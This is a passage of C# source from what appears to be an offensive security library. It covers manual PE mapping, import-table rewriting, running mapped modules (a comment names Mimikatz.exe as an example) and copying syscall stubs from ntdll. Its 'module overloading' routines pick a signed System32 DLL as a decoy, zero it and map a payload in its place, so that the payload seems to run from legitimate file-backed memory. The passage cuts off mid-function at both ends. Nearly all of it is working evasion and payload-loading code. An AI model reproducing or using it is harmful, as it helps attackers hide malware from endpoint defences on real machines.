            IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + ApiSetMapOffset));
            PE.ApiSetNamespace Namespace = new PE.ApiSetNamespace();
            Namespace = (PE.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(PE.ApiSetNamespace));
            for (var i = 0; i < Namespace.Count; i++)
            {
                PE.ApiSetNamespaceEntry SetEntry = new PE.ApiSetNamespaceEntry();
                SetEntry = (PE.ApiSetNamespaceEntry)Marshal.PtrToStructure((IntPtr)((UInt64)pApiSetNamespace + (UInt64)Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry))), typeof(PE.ApiSetNamespaceEntry));
                String ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.NameOffset), SetEntry.NameLength/2) + ".dll";

                PE.ApiSetValueEntry SetValue = new PE.ApiSetValueEntry();
                SetValue = (PE.ApiSetValueEntry)Marshal.PtrToStructure((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset), typeof(PE.ApiSetValueEntry));
                String ApiSetValue = String.Empty;
                if (SetValue.ValueCount != 0)
                {
                    ApiSetValue = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset), SetValue.ValueCount/2);

                }

                // Add pair to dict
                ApiSetDict.Add(ApiSetEntryName, ApiSetValue);
            }

            // Return dict
            return ApiSetDict;
        }

        /// <summary>
        /// Rewrite IAT for manually mapped module.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>Void</returns>
        public static void RewriteModuleIAT(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            PE.IMAGE_DATA_DIRECTORY idd = new PE.IMAGE_DATA_DIRECTORY();
            if (PEINFO.Is32Bit)
            {
                idd = PEINFO.OptHeader32.ImportTable;
            }
            else
            {
                idd = PEINFO.OptHeader64.ImportTable;
            }

            // Ptr for the base import directory
            IntPtr pImportTable = (IntPtr)((UInt64)ModuleMemoryBase + idd.VirtualAddress);

            // Get API Set mapping dictionary if on Win10+
            Execution.Native.OSVERSIONINFOEX OSVersion = new Execution.Native.OSVERSIONINFOEX();
            Native.RtlGetVersion(ref OSVersion);
            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();
            if (OSVersion.MajorVersion >= 10)
            {
                ApiSetDict = GetApiSetMapping();
            }

            // Loop IID's
            Execution.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR iid = new Execution.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR();
            for (int i = 0; true; i++)
            {
                iid = (Execution.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure((IntPtr)((UInt64)pImportTable + (uint)(Marshal.SizeOf(iid) * i)), typeof(Execution.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR));
                if (iid.Name == 0)
                {
                    break;
                }

                // Get DLL
                String DllName = String.Empty;
                try
                {
                    DllName = Marshal.PtrToStringAnsi((IntPtr)((UInt64)ModuleMemoryBase + iid.Name));
                }
                catch { }

                // Loop imports
                if (DllName != String.Empty)
                {
                    // API Set DLL?
                    if (OSVersion.MajorVersion >= 10)
                    {
                        if (DllName.StartsWith("api-") || DllName.StartsWith("ext-"))
                        {
                            if (ApiSetDict.ContainsKey(DllName))
                            {
                                if (ApiSetDict[DllName].Length > 0)
                                {
                                    // Not all API set DLL's have a registered host mapping
                                    DllName = ApiSetDict[DllName];
                                }
                            }
                        }
                    }
                    
                    // Check and / or load DLL
                    IntPtr hModule = GetLoadedModuleAddress(DllName);
                    if (hModule == IntPtr.Zero)
                    {
                        hModule = LoadModuleFromDisk(DllName);
                        if (hModule == IntPtr.Zero)
                        {
                            throw new FileNotFoundException(DllName + ", unable to find the specified file.");
                        }
                    }

                    // Loop thunks
                    if (PEINFO.Is32Bit)
                    {
                        PE.IMAGE_THUNK_DATA32 oft_itd = new PE.IMAGE_THUNK_DATA32();
                        for (int y = 0; true; y++)
                        {
                            oft_itd = (PE.IMAGE_THUNK_DATA32)Marshal.PtrToStructure((IntPtr)((UInt64)ModuleMemoryBase + iid.OriginalFirstThunk + (UInt32)(y * (sizeof(UInt32)))), typeof(PE.IMAGE_THUNK_DATA32));
                            IntPtr ft_itd = (IntPtr)((UInt64)ModuleMemoryBase + iid.FirstThunk + (UInt64)(y * (sizeof(UInt32))));
                            if (oft_itd.AddressOfData == 0)
                            {
                                break;
                            }

                            if (oft_itd.AddressOfData < 0x80000000) // !IMAGE_ORDINAL_FLAG32
                            {
                                IntPtr pImpByName = (IntPtr)((UInt64)ModuleMemoryBase + oft_itd.AddressOfData + sizeof(UInt16));
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));

                                // Write ProcAddress
                                Marshal.WriteInt32(ft_itd, pFunc.ToInt32());
                            }
                            else
                            {
                                ulong fOrdinal = oft_itd.AddressOfData & 0xFFFF;
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, (short)fOrdinal);

                                // Write ProcAddress
                                Marshal.WriteInt32(ft_itd, pFunc.ToInt32());
                            }
                        }
                    } else
                    {
                        PE.IMAGE_THUNK_DATA64 oft_itd = new PE.IMAGE_THUNK_DATA64();
                        for (int y = 0; true; y++)
                        {
                            oft_itd = (PE.IMAGE_THUNK_DATA64)Marshal.PtrToStructure((IntPtr)((UInt64)ModuleMemoryBase + iid.OriginalFirstThunk + (UInt64)(y * (sizeof(UInt64)))), typeof(PE.IMAGE_THUNK_DATA64));
                            IntPtr ft_itd = (IntPtr)((UInt64)ModuleMemoryBase + iid.FirstThunk + (UInt64)(y * (sizeof(UInt64))));
                            if (oft_itd.AddressOfData == 0)
                            {
                                break;
                            }

                            if (oft_itd.AddressOfData < 0x8000000000000000) // !IMAGE_ORDINAL_FLAG64
                            {
                                IntPtr pImpByName = (IntPtr)((UInt64)ModuleMemoryBase + oft_itd.AddressOfData + sizeof(UInt16));
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));

                                // Write pointer
                                Marshal.WriteInt64(ft_itd, pFunc.ToInt64());
                            }
                            else
                            {
                                ulong fOrdinal = oft_itd.AddressOfData & 0xFFFF;
                                IntPtr pFunc = IntPtr.Zero;
                                pFunc = GetNativeExportAddress(hModule, (short)fOrdinal);

                                // Write pointer
                                Marshal.WriteInt64(ft_itd, pFunc.ToInt64());
                            }
                        }
                    }
                } else
                {
                    throw new InvalidOperationException("Failed to read DLL name.");
                }
            }
        }

        /// <summary>
        /// Set correct module section permissions.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>Void</returns>
        public static void SetModuleSectionPermissions(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            // Apply RO to the module header
            IntPtr BaseOfCode = IntPtr.Zero;
            if (PEINFO.Is32Bit)
            {
                BaseOfCode = (IntPtr)PEINFO.OptHeader32.BaseOfCode;
            }
            else
            {
                BaseOfCode = (IntPtr)PEINFO.OptHeader64.BaseOfCode;
            }
            Native.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleMemoryBase, ref BaseOfCode, Execution.Win32.WinNT.PAGE_READONLY);

            // Apply section permissions
            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                Boolean isRead = (ish.Characteristics & PE.DataSectionFlags.MEM_READ) != 0;
                Boolean isWrite = (ish.Characteristics & PE.DataSectionFlags.MEM_WRITE) != 0;
                Boolean isExecute = (ish.Characteristics & PE.DataSectionFlags.MEM_EXECUTE) != 0;
                uint flNewProtect = 0;
                if (isRead & !isWrite & !isExecute)
                {
                    flNewProtect = Execution.Win32.WinNT.PAGE_READONLY;
                }
                else if (isRead & isWrite & !isExecute)
                {
                    flNewProtect = Execution.Win32.WinNT.PAGE_READWRITE;
                }
                else if (isRead & isWrite & isExecute)
                {
                    flNewProtect = Execution.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                }
                else if (isRead & !isWrite & isExecute)
                {
                    flNewProtect = Execution.Win32.WinNT.PAGE_EXECUTE_READ;
                }
                else if (!isRead & !isWrite & isExecute)
                {
                    flNewProtect = Execution.Win32.WinNT.PAGE_EXECUTE;
                }
                else
                {
                    throw new InvalidOperationException("Unknown section flag, " + ish.Characteristics);
                }

                // Calculate base
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)ModuleMemoryBase + ish.VirtualAddress);
                IntPtr ProtectSize = (IntPtr)ish.VirtualSize;

                // Set protection
                Native.NtProtectVirtualMemory((IntPtr)(-1), ref pVirtualSectionBase, ref ProtectSize, flNewProtect);
            }
        }

        /// <summary>
        /// Manually map module into current process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModulePath">Full path to the module on disk.</param>
        /// <returns>PE_MANUAL_MAP object</returns>
        public static PE.PE_MANUAL_MAP MapModuleToMemory(string ModulePath)
        {
            // Verify process & architecture
            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Manual mapping in WOW64 is not supported.");
            }

            // Alloc module into memory for parsing
            IntPtr ModlePointer = FileToMemoryPointer(ModulePath);

            // Fetch PE meta data
            PE.PE_META_DATA PEINFO = GetPeMetaData(ModlePointer);

            // Check module matches the process architecture
            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
            {
                Marshal.FreeHGlobal(ModlePointer);
                throw new InvalidOperationException("The module architecture does not match the process architecture.");
            }

            // Alloc PE image memory -> RW
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr RegionSize = IntPtr.Zero;
            UInt32 SizeOfHeaders = 0;
            if (PEINFO.Is32Bit)
            {
                RegionSize = (IntPtr)PEINFO.OptHeader32.SizeOfImage;
                SizeOfHeaders = PEINFO.OptHeader32.SizeOfHeaders;
            }
            else
            {
                RegionSize = (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                SizeOfHeaders = PEINFO.OptHeader64.SizeOfHeaders;
            }
            IntPtr pImage = Native.NtAllocateVirtualMemory((IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize, Execution.Win32.Kernel32.MEM_COMMIT | Execution.Win32.Kernel32.MEM_RESERVE, Execution.Win32.WinNT.PAGE_READWRITE);

            // Write PE header to memory
            UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, ModlePointer, SizeOfHeaders);

            // Write sections to memory
            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)ModlePointer + ish.PointerToRawData);

                // Write data
                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                if (BytesWritten != ish.SizeOfRawData)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            // Perform relocations
            RelocateModule(PEINFO, pImage);

            // Rewrite IAT
            RewriteModuleIAT(PEINFO, pImage);

            // Set memory protections
            SetModuleSectionPermissions(PEINFO, pImage);

            // Free temp HGlobal
            Marshal.FreeHGlobal(ModlePointer);

            // Prepare return object
            PE.PE_MANUAL_MAP ManMapObject = new PE.PE_MANUAL_MAP();
            ManMapObject.ModuleBase = pImage;
            ManMapObject.PEINFO = PEINFO;

            return ManMapObject;
        }

        /// <summary>
        /// Manually map module into current process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleByteArray">Full byte array of the module.</param>
        /// <returns>PE_MANUAL_MAP object</returns>
        public static PE.PE_MANUAL_MAP MapModuleToMemory(byte[] ModuleByteArray)
        {
            // Verify process & architecture
            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Manual mapping in WOW64 is not supported.");
            }

            // Alloc module into memory for parsing
            IntPtr ModlePointer = FileToMemoryPointer(ModuleByteArray);

            // Fetch PE meta data
            PE.PE_META_DATA PEINFO = GetPeMetaData(ModlePointer);

            // Check module matches the process architecture
            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
            {
                Marshal.FreeHGlobal(ModlePointer);
                throw new InvalidOperationException("The module architecture does not match the process architecture.");
            }

            // Alloc PE image memory -> RW
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr RegionSize = IntPtr.Zero;
            UInt32 SizeOfHeaders = 0;
            if (PEINFO.Is32Bit)
            {
                RegionSize = (IntPtr)PEINFO.OptHeader32.SizeOfImage;
                SizeOfHeaders = PEINFO.OptHeader32.SizeOfHeaders;
            }
            else
            {
                RegionSize = (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                SizeOfHeaders = PEINFO.OptHeader64.SizeOfHeaders;
            }
            IntPtr pImage = Native.NtAllocateVirtualMemory((IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize, Execution.Win32.Kernel32.MEM_COMMIT | Execution.Win32.Kernel32.MEM_RESERVE, Execution.Win32.WinNT.PAGE_READWRITE);

            // Write PE header to memory
            UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, ModlePointer, SizeOfHeaders);

            // Write sections to memory
            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)ModlePointer + ish.PointerToRawData);

                // Write data
                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                if (BytesWritten != ish.SizeOfRawData)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            // Perform relocations
            RelocateModule(PEINFO, pImage);

            // Rewrite IAT
            RewriteModuleIAT(PEINFO, pImage);

            // Set memory protections
            SetModuleSectionPermissions(PEINFO, pImage);

            // Free temp HGlobal
            Marshal.FreeHGlobal(ModlePointer);

            // Prepare return object
            PE.PE_MANUAL_MAP ManMapObject = new PE.PE_MANUAL_MAP();
            ManMapObject.ModuleBase = pImage;
            ManMapObject.PEINFO = PEINFO;

            return ManMapObject;
        }

        /// <summary>
        /// Locate a signed module with a minimum size which can be used for overloading.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="MinSize">Minimum module byte size.</param>
        /// <returns>String, either a full path for the candidate module or String.Empty</returns>
        public static string FindDecoyModule(long MinSize)
        {
            bool HasValidSignature(string FilePath)
            {
                X509Certificate2 FileCertificate;
                try
                {
                    X509Certificate TheSigner = X509Certificate.CreateFromSignedFile(FilePath);
                    FileCertificate = new X509Certificate2(TheSigner);
                }
                catch
                {
                    return false;
                }

                X509Chain CertificateChain = new X509Chain();
                CertificateChain.ChainPolicy.RevocationFlag = X509RevocationFlag.EntireChain;
                CertificateChain.ChainPolicy.RevocationMode = X509RevocationMode.Offline;
                CertificateChain.ChainPolicy.VerificationFlags = X509VerificationFlags.NoFlag;

                return CertificateChain.Build(FileCertificate);
            }

            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + "\\System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                    continue;
                }
            }

            Random r = new Random();
            List<int> candidates = new List<int>();
            while (candidates.Count != files.Count)
            {
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                if (candidates.Contains(rInt) == false &&
                    new FileInfo(currentCandidate).Length >= MinSize &&
                    HasValidSignature(currentCandidate) == true)
                {
                    return currentCandidate;
                }
                candidates.Add(rInt);
            }
            return String.Empty;
        }

        /// <summary>
        /// Manually map module into current process starting at the specified base address.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleByteArray">Full byte array of the module.</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>PE_MANUAL_MAP object</returns>
        public static PE.PE_MANUAL_MAP MapModuleToMemoryAddress(byte[] ModuleByteArray, IntPtr ModuleMemoryBase)
        {
            // Verify process & architecture
            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Manual mapping in WOW64 is not supported.");
            }

            // Alloc module into memory for parsing
            IntPtr ModlePointer = FileToMemoryPointer(ModuleByteArray);

            // Fetch PE meta data
            PE.PE_META_DATA PEINFO = GetPeMetaData(ModlePointer);

            // Check module matches the process architecture
            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
            {
                Marshal.FreeHGlobal(ModlePointer);
                throw new InvalidOperationException("The module architecture does not match the process architecture.");
            }

            UInt32 SizeOfHeaders = 0;
            if (PEINFO.Is32Bit)
            {
                SizeOfHeaders = PEINFO.OptHeader32.SizeOfHeaders;
            }
            else
            {
                SizeOfHeaders = PEINFO.OptHeader64.SizeOfHeaders;
            }

            // Write PE header to memory
            UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), ModuleMemoryBase, ModlePointer, SizeOfHeaders);

            // Write sections to memory
            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)ModuleMemoryBase + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)ModlePointer + ish.PointerToRawData);

                // Write data
                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                if (BytesWritten != ish.SizeOfRawData)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            // Perform relocations
            RelocateModule(PEINFO, ModuleMemoryBase);

            // Rewrite IAT
            RewriteModuleIAT(PEINFO, ModuleMemoryBase);

            // Set memory protections
            SetModuleSectionPermissions(PEINFO, ModuleMemoryBase);

            // Free temp HGlobal
            Marshal.FreeHGlobal(ModlePointer);

            // Prepare return object
            PE.PE_MANUAL_MAP ManMapObject = new PE.PE_MANUAL_MAP();
            ManMapObject.ModuleBase = ModuleMemoryBase;
            ManMapObject.PEINFO = PEINFO;

            return ManMapObject;
        }

        /// <summary>
        /// Load a signed decoy module into memory, creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="PayloadPath">Full path to the payload module on disk.</param>
        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null)
        {
            // Verify process & architecture
            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Module overloading in WOW64 is not supported.");
            }

            // Get approximate size of Payload
            if (!File.Exists(PayloadPath))
            {
                throw new InvalidOperationException("Payload filepath not found.");
            }
            byte[] PayloadFileBytes = File.ReadAllBytes(PayloadPath);

            // Did we get a DecoyModule?
            if (!String.IsNullOrEmpty(DecoyModulePath))
            {
                if (!File.Exists(DecoyModulePath))
                {
                    throw new InvalidOperationException("Decoy filepath not found.");
                }
                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
                if (DecoyFileBytes.Length < PayloadFileBytes.Length)
                {
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
                }
            } else
            {
                DecoyModulePath = FindDecoyModule(PayloadFileBytes.Length);
                if (String.IsNullOrEmpty(DecoyModulePath))
                {
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
                }
            }

            // Map decoy from disk
            Execution.PE.PE_MANUAL_MAP DecoyMetaData = MapModuleFromDisk(DecoyModulePath);
            IntPtr RegionSize = IntPtr.Zero;
            if (DecoyMetaData.PEINFO.Is32Bit)
            {
                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader32.SizeOfImage);
            } else
            {
                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader64.SizeOfImage);
            }
            // Change permissions to RW
            Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Execution.Win32.WinNT.PAGE_READWRITE);

            // Zero out memory
            Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);

            // Overload module in memory
            PE.PE_MANUAL_MAP OverloadedModuleMetaData = MapModuleToMemoryAddress(PayloadFileBytes, DecoyMetaData.ModuleBase);
            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;

            return OverloadedModuleMetaData;
        }

        /// <summary>
        /// Load a signed decoy module into memory creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="PayloadByteArray">Full byte array for the payload module.</param>
        /// <param name="DecoyModule">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static PE.PE_MANUAL_MAP OverloadModule(byte[] PayloadFileBytes, string DecoyModulePath = null)
        {
            // Verify process & architecture
            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Module overloading in WOW64 is not supported.");
            }

            // Did we get a DecoyModule?
            if (!String.IsNullOrEmpty(DecoyModulePath))
            {
                if (!File.Exists(DecoyModulePath))
                {
                    throw new InvalidOperationException("Decoy filepath not found.");
                }
                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
                if (DecoyFileBytes.Length < PayloadFileBytes.Length)
                {
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
                }
            }
            else
            {
                DecoyModulePath = FindDecoyModule(PayloadFileBytes.Length);
                if (String.IsNullOrEmpty(DecoyModulePath))
                {
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
                }
            }

            // Map decoy from disk
            Execution.PE.PE_MANUAL_MAP DecoyMetaData = MapModuleFromDisk(DecoyModulePath);
            IntPtr RegionSize = IntPtr.Zero;
            if (DecoyMetaData.PEINFO.Is32Bit)
            {
                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader32.SizeOfImage);
            }
            else
            {
                RegionSize = (IntPtr)(DecoyMetaData.PEINFO.OptHeader64.SizeOfImage);
            }
            // Change permissions to RW
            Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Execution.Win32.WinNT.PAGE_READWRITE);

            // Zero out memory
            Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);

            // Overload module in memory
            PE.PE_MANUAL_MAP OverloadedModuleMetaData = MapModuleToMemoryAddress(PayloadFileBytes, DecoyMetaData.ModuleBase);
            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;

            return OverloadedModuleMetaData;
        }

        /// <summary>
        /// Call a manually mapped PE by its EntryPoint.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>Void</returns>
        public static void CallMappedPEModule(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            // Call module by EntryPoint (eg Mimikatz.exe)
            IntPtr hRemoteThread = IntPtr.Zero;
            IntPtr lpStartAddress = IntPtr.Zero;
            if (PEINFO.Is32Bit)
            {
                lpStartAddress = (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint);
            }
            else
            {
                lpStartAddress = (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
            }

            Native.NtCreateThreadEx(ref hRemoteThread, Execute.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero, (IntPtr)(-1), lpStartAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }

        /// <summary>
        /// Call a manually mapped DLL by DllMain -> DLL_PROCESS_ATTACH.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>Void</returns>
        public static void CallMappedDLLModule(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            IntPtr lpEntryPoint = IntPtr.Zero;
            if (PEINFO.Is32Bit)
            {
                lpEntryPoint = (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint);
            }
            else
            {
                lpEntryPoint = (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
            }

            PE.DllMain fDllMain = (PE.DllMain)Marshal.GetDelegateForFunctionPointer(lpEntryPoint, typeof(PE.DllMain));
            Boolean CallRes = fDllMain(ModuleMemoryBase, PE.DLL_PROCESS_ATTACH, IntPtr.Zero);
            if (!CallRes)
            {
                throw new InvalidOperationException("Failed to call DllMain -> DLL_PROCESS_ATTACH");
            }
        }

        /// <summary>
        /// Call a manually mapped DLL by Export.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Void</returns>
        public static object CallMappedDLLModuleExport(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase, String ExportName, Type FunctionDelegateType, object[] Parameters)
        {
            // Call module by DllMain -> DLL_PROCESS_ATTACH
            IntPtr lpEntryPoint = IntPtr.Zero;
            if (PEINFO.Is32Bit)
            {
                lpEntryPoint = (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint);
            }
            else
            {
                lpEntryPoint = (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
            }

            PE.DllMain fDllMain = (PE.DllMain)Marshal.GetDelegateForFunctionPointer(lpEntryPoint, typeof(PE.DllMain));
            Boolean CallRes = fDllMain(ModuleMemoryBase, PE.DLL_PROCESS_ATTACH, IntPtr.Zero);
            if (!CallRes)
            {
                throw new InvalidOperationException("Failed to call DllMain -> DLL_PROCESS_ATTACH");
            }

            // Get export pointer
            IntPtr pFunc = GetExportAddress(ModuleMemoryBase, ExportName);

            // Call export
            return DynamicFunctionInvoke(pFunc, FunctionDelegateType, ref Parameters);
        }

        /// <summary>
        /// Read ntdll from disk, find/copy the appropriate syscall stub and free ntdll.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="FunctionName">The name of the function to search for (e.g. "NtAlertResumeThread").</param>
        /// <returns>IntPtr, Syscall stub</returns>
        public static IntPtr GetSyscallStub(string FunctionName)
        {
            // Verify process & architecture
            Boolean isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            if (IntPtr.Size == 4 && isWOW64)
            {
                throw new InvalidOperationException("Generating Syscall stubs is not supported for WOW64.");
            }

            // Find the path for ntdll by looking at the currently loaded module
            String NtdllPath = String.Empty;
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith("ntdll.dll"))
                {
                    NtdllPath = Mod.FileName;
                }
            }

            // Alloc module into memory for parsing
            IntPtr ModlePointer = FileToMemoryPointer(NtdllPath);

            // Fetch PE meta data
            PE.PE_META_DATA PEINFO = GetPeMetaData(ModlePointer);

            // Alloc PE image memory -> RW
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr RegionSize = IntPtr.Zero;
            UInt32 SizeOfHeaders = 0;
            if (PEINFO.Is32Bit)
            {
                RegionSize = (IntPtr)PEINFO.OptHeader32.SizeOfImage;
                SizeOfHeaders = PEINFO.OptHeader32.SizeOfHeaders;
            }
            else
            {
                RegionSize = (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                SizeOfHeaders = PEINFO.OptHeader64.SizeOfHeaders;
            }
